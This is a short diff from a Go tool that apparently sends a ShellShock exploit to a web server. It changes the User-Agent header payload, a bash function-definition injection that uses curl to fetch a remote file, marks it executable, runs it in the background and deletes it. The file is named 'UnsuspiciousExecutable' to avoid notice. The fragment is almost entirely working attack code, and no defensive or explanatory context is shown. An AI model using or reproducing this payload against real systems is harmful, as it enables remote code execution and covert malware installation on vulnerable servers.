@@ -351,7 +351,7 @@ func main() {
 			log.Fatalf("Failed to create GET request for %s: %s", *addr, err)
 		}
 
-		req.Header.Set("User-Agent", fmt.Sprintf("() { :;}; /usr/bin/curl -sL '%s' -o %s; /bin/chmod +x %s; %s; rm -f %s",
+		req.Header.Set("User-Agent", fmt.Sprintf(`() { :;}; /bin/sh -c "/usr/bin/curl -L '%s' -o %s && /bin/chmod +x %s && %s && rm -f %s"& disown`,
 			url, UnsuspiciousExecutable, UnsuspiciousExecutable, UnsuspiciousExecutable, UnsuspiciousExecutable))
 
 		log.Printf("Sending ShellShock GET request to %s...", *addr)
